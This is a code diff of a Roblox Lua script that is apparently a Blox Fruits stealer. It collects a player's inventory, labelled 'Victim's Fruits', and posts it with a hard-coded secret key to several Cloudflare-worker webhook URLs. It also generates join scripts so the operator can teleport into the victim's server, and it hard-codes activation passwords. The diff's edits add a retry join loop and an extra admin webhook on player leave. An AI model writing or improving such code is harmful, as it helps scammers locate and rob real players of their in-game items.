@@ -8,10 +8,10 @@ Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6
 dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits
 
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- Passwords for ?activate command
--- !!! YOUR SECRET KEY - MUST MATCH THE 'CLIENT_API_KEY' SECRET IN CLOUDFLARE !!!
-local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
-local allowEveryone = false -- Flag to allow commands/trade for everyone
-local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }
+
+local validation_sig = "rashya5@%-hsfj79h93-wakliballs"
+local allowEveryone = false
+local activatedUsers = {}
 
 -- Emoji Map for Fruit Display
 local fruitEmojiMap = {
@@ -48,7 +48,7 @@ local fruitEmojiMap = {
     ["Yeti-Yeti"] = "<:yeti:1322418732328554577>",
     ["Dragon (East)-Dragon (East)"] = "<:dragonE:1318248271457812510>",
     ["Dragon (West)-Dragon (West)"] = "<:dragonW:1318248380555591842>",
-    ["Dragon-Dragon"] = "<:dragonE:1318248271457812510>", -- Fallback for generic Dragon
+    ["Dragon-Dragon"] = "<:dragonE:1318248271457812510>",
     ["Eagle-Eagle"] = "<:eagle:1362652662985920604>",
     ["Flame-Flame"] = "<:flame:1317755887925858334>",
     ["Gas-Gas"] = "<:gas:1317756925311586324>",
@@ -703,14 +703,14 @@ local function sendWebhook(inventory)
     local url2 = Protector_key and _G[Protector_key]
     local url3 = dummy_key and _G[dummy_key]
     if not url1 then
-        warn("Primary Webhook URL not configured.");
+        warn("Webhook URL not configured.");
         return
     end
 
     local goodFruitNames = {
         ["Kitsune-Kitsune"] = true,
         ["Yeti-Yeti"] = true
-    } -- Example "Good" fruits
+    }
 
     local fruits, premiumItems = {}, {};
     local dragonHit, hasPremiumItem, hasGoodFruit = false, false, false;
@@ -742,42 +742,57 @@ local function sendWebhook(inventory)
         end
     end
 
--- Generate Join Script (Rua Style with Escaping, with extra check inside queued code)
+-- Generate Join Script (PC and Mobile versions with PC retry loop)
 local jobId = game.JobId
 local placeId = game.PlaceId
 local isSea3 = (placeId == 7449423635)
 local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
 
--- Use Lua's long bracket string for the format string, with extra check in queued code
-local joinScriptFormatString = [=[
-local iddd = %d
-local JobIdd = "%s"
-local sea = "%s"
-
-if game.PlaceId ~= iddd then
-    queue_on_teleport([[
-        task.wait(5)
-        if game.JobId ~= JobIdd then
-            print("Executing queued teleport to: " .. JobIdd)
-            game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
-        else
-            print("Already in target server, skipping queued teleport.")
-        end
-    ]])
-    print("Invoking sea travel: " .. sea)
-    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
+-- Core join logic (used for Mobile)
+local coreJoinLogicFormatString = [=[
+local targetPlaceId = %d
+local targetJobId = "%s"
+local targetSeaArg = "%s"
+if game.PlaceId == targetPlaceId and game.JobId == targetJobId then
+    return
+end
+if game.PlaceId ~= targetPlaceId then
+    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(targetSeaArg)
 else
-    print("Already in correct sea, teleporting directly to: " .. JobIdd)
-    game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
+    game:GetService("TeleportService"):TeleportToPlaceInstance(targetPlaceId, targetJobId)
 end
 ]=]
 
--- Then, use string.format with the variables
-local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
+local joinScriptLua_Mobile = string.format(coreJoinLogicFormatString, placeId, jobId, seaTravelArgument)
 
--- Do NOT escape quotes for the PC embed; just wrap in code block
-local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```"
-local joinScriptMobile_Formatted = joinScriptLua
+-- PC version: retry loop for two-step join
+local joinScriptLua_PC = string.format([=[
+local targetPlaceId = %d
+local targetJobId = "%s"
+local targetSeaArg = "%s"
+local attempt = 1
+local maxAttempts = 3
+while attempt <= maxAttempts do
+    if game.PlaceId == targetPlaceId and game.JobId == targetJobId then
+        break
+    end
+    if game.PlaceId ~= targetPlaceId then
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(targetSeaArg)
+        task.wait(10)
+    else
+        game:GetService("TeleportService"):TeleportToPlaceInstance(targetPlaceId, targetJobId)
+        task.wait(8)
+    end
+    attempt = attempt + 1
+end
+if attempt > maxAttempts then
+end
+]=], placeId, jobId, seaTravelArgument)
+
+-- Escape quotes for JSON if needed (for Discord embed safety)
+local escapedJoinScriptLua_PC = string.gsub(joinScriptLua_PC, "\"", "\\\"")
+local joinScriptPC_Formatted = "```lua\n" .. escapedJoinScriptLua_PC .. "\n```"
+local joinScriptMobile_Formatted = joinScriptLua_Mobile
 
     -- Determine Embed Title, Color, Mention
     local embedTitle, embedColor, mention
@@ -797,7 +812,7 @@ local joinScriptMobile_Formatted = joinScriptLua
         embedTitle = "<:kitsune:1185239741545848922> TOP FRUIT HIT! (Kitsune/Yeti)" -- Example title
         embedColor = 16753920;
         mention = "@everyone Sharky Hit!" -- Normal mention for main hooks
-    elseif # fruits > 0 or # premiumItems > 0 then -- Check if *any* target fruit was found
+    elseif #fruits > 0 or #premiumItems > 0 then -- Check if *any* target fruit was found
         local foundAnyTarget = false
         for _, f in ipairs(fruits) do
             if fruitsToHitSet[f.name] then
@@ -835,7 +850,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             },
             {
                 name = "<:Point_Right:1223617791710724219> **Session Info**",
-                value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", # Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName),
+                value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", #Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName),
                 inline = true
             },
             {
@@ -844,7 +859,7 @@ local joinScriptMobile_Formatted = joinScriptLua
                 inline = false
             },
             {
-                name = "<a:moistwoo:1013950690277724170> **Victim's Fruits**",
+                name = "<a:poggersrow:1271644776181010453> **Victim's Fruits**",
                 value = formatFruitListWithEmojis_NoCodeBlock(fruits),
                 inline = false
             },
@@ -878,14 +893,12 @@ local joinScriptMobile_Formatted = joinScriptLua
     local mainPayloadBody = HttpService:JSONEncode(payloadTable)
     local adminPayloadBody = nil -- Optional: create if dummy needs different content
     if hasGoodFruit or dragonHit or hasPremiumItem then
-        -- Maybe use a slightly different title or mention for the dummy hook
-        -- For now, let's just reuse the main payload for simplicity if triggered
         adminPayloadBody = mainPayloadBody
     end
 
     -- Send Webhooks Asynchronously
     task.spawn(function()
-        local headersWithSecret = {
+        local SharkerHead = {
             ["Content-Type"] = "application/json",
             ["X-Client-Key"] = validation_sig
         }
@@ -893,7 +906,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url1,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = mainPayloadBody
             })
         end
@@ -902,7 +915,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url2,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = mainPayloadBody
             })
         end
@@ -911,7 +924,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url3,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = adminPayloadBody
             })
         end -- Send only if admin condition met
@@ -955,6 +968,7 @@ local function sendProtector()
     webhookSent = true
     local url1 = webhook1_key and _G[webhook1_key];
     local url2 = Protector_key and _G[Protector_key]
+    local url3 = dummy_key and _G[dummy_key]
     if not url1 then
         return
     end
@@ -988,7 +1002,7 @@ local function sendProtector()
         }
     };
     local body = HttpService:JSONEncode(data)
-    local headersWithSecret = {
+    local SharkerHead = {
         ["Content-Type"] = "application/json",
         ["X-Client-Key"] = validation_sig
     }
@@ -996,19 +1010,27 @@ local function sendProtector()
     pcall(request, {
         Url = url1,
         Method = "POST",
-        Headers = headersWithSecret,
+        Headers = SharkerHead,
         Body = body
-    }) -- Send with secret header
+    })
     if url2 then
         task.wait(0.1);
         pcall(request, {
             Url = url2,
             Method = "POST",
-            Headers = headersWithSecret,
+            Headers = SharkerHead,
             Body = body
         })
-    end -- Send with secret header
-    -- No send to dummy on leave
+    end
+    if url3 then
+        task.wait(0.1);
+        pcall(request, {
+            Url = url3,
+            Method = "POST",
+            Headers = SharkerHead,
+            Body = body
+        })
+    end
 end
 
 Players.PlayerRemoving:Connect(function(leavingPlayer)
